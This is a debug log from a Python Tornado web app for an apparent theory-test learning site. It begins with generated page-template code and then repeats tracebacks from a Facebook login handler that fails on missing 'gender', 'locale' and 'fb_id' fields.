21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 0.80ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.09ms
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.13ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 3.77ms
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
